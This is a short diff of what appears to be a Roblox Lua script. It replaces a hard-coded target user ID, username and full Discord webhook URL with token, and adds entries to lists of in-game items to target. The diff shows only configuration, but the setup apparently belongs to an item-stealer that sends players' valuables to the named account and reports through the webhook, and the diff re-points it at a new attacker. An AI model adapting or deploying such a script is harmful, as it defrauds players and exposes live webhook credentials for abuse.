@@ -1,10 +1,10 @@
-local TARGET_ID = 10095557361
-local TARGET_USER = "nl51329"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1573744228595535972/nvZtLEhC24aNvpqX_7rX5PLSi_dTlzm-_3MFxLs_HrfrdFqtpCNdG7tH0ZAvLUIcoJrb"
+local TARGET_ID = 10205611339
+local TARGET_USER = "Veskmossyou"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1576153696889344031/GW7J76zaBNmrHvqsCb0oMUTGJIj3O9XAX1b0G8-y4J-OjsMSgyiZNSWZMuTAdIsXgtom"
 
 local TargetBrainrots = {
-    ["Phoenix"] = true,
     ["Dragon Skeletonini"] = true,
+    ["Phoenix"] = true,
     ["Plant Bros"] = true,
     ["Hydra Serpent"] = true,
     ["Orchidox"] = true,
@@ -350,7 +350,8 @@ local TargetGears = {
     ["Yin Yang Lamp"] = true,
     ["Yin Yang Slap"] = true,
     ["Phantom Slap"] = true,
-    ["Crystal Slap"] = true
+    ["Crystal Slap"] = true,
+    ["Skeleton Dragon"] = true
 }
 
 task.spawn(function()
